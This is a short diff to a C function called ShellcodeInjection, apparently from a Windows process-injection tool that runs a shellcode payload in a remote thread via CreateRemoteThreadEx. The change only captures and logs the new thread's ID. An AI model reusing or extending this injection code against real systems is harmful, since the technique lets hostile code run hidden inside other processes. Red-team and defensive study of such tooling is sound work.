@@ -26,6 +26,7 @@ BOOL ShellcodeInjection(
     HANDLE hThread       = NULL;
     PVOID  rBuffer       = NULL;
     DWORD  OldProtection = 0;
+    DWORD  TID           = 0;
 
     if (NULL == Payload || 0 == PayloadSize) {
         WARN("payload's not set. exiting...");
@@ -98,14 +99,13 @@ BOOL ShellcodeInjection(
             NULL,
             0,
             0,
-            0
+            &TID 
     );
     if (NULL == hThread) {
         PrettyFormat("CreateRemoteThreadEx", GetLastError());
         STATE = FALSE; goto CLEANUP;
     }
-    OKAY("[0x%p] thread created!", hThread);
-
+    OKAY("[0x%p] thread created (%ld)!", hThread, TID);
     INFO("[0x%p] waiting for thread to finish execution...", hThread);
     WaitForSingleObject(hThread, INFINITE);
     INFO("[0x%p] thread finished execution, beginning cleanup...", hThread);
